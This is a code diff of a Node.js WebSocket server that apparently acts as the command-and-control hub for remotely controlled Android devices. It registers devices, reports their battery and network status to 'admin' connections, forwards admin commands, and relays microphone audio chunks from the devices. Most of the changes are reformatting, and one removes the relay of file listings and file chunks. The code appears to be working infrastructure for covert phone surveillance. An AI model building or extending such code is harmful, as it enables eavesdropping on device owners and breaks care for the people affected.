@@ -36,20 +36,30 @@ wss.on('connection', (ws) => {
         }
         if (t === 'register_admin') {
             role = 'admin'; admins.add(ws);
-            console.log('[+] admin online'); sendDevicesList(ws); return;
+            console.log('[+] admin online');
+            sendDevicesList(ws);
+            return;
         }
         if (t === 'ping') { safeSend(ws, { type: 'pong' }); return; }
         if (t === 'status' && role === 'client') {
             const c = clients.get(clientId);
-            if (c) { c.name = msg.name || c.name; c.network = msg.network || c.network; c.battery = typeof msg.battery === 'number' ? msg.battery : c.battery; c.android = msg.android || c.android; c.lastSeen = Date.now(); }
-            broadcastAdmins({ type: 'status', deviceId: clientId, name: c ? c.name : '', network: c ? c.network : '', battery: c ? c.battery : 0, android: c ? c.android : '', online: true });
+            if (c) {
+                c.name = msg.name || c.name;
+                c.network = msg.network || c.network;
+                c.battery = typeof msg.battery === 'number' ? msg.battery : c.battery;
+                c.android = msg.android || c.android;
+                c.lastSeen = Date.now();
+            }
+            broadcastAdmins({ type: 'status', deviceId: clientId,
+                name: c ? c.name : '', network: c ? c.network : '',
+                battery: c ? c.battery : 0, android: c ? c.android : '', online: true });
             return;
         }
         if (t === 'log' && role === 'client') {
             broadcastAdmins({ type: 'log', deviceId: clientId, message: msg.message || '', ts: Date.now() });
             return;
         }
-        if ((t === 'files_list' || t === 'file_chunk' || t === 'mic_chunk') && role === 'client') {
+        if (t === 'mic_chunk' && role === 'client') {
             broadcastAdmins(msg); return;
         }
         if (t === 'command' && role === 'admin') {
@@ -63,8 +73,11 @@ wss.on('connection', (ws) => {
         }
     });
     ws.on('close', () => {
-        if (role === 'client' && clientId) { clients.delete(clientId); console.log('[-] client offline: ' + clientId); broadcastAdmins({ type: 'client_offline', deviceId: clientId }); }
-        else if (role === 'admin') admins.delete(ws);
+        if (role === 'client' && clientId) {
+            clients.delete(clientId);
+            console.log('[-] client offline: ' + clientId);
+            broadcastAdmins({ type: 'client_offline', deviceId: clientId });
+        } else if (role === 'admin') admins.delete(ws);
     });
 });
 
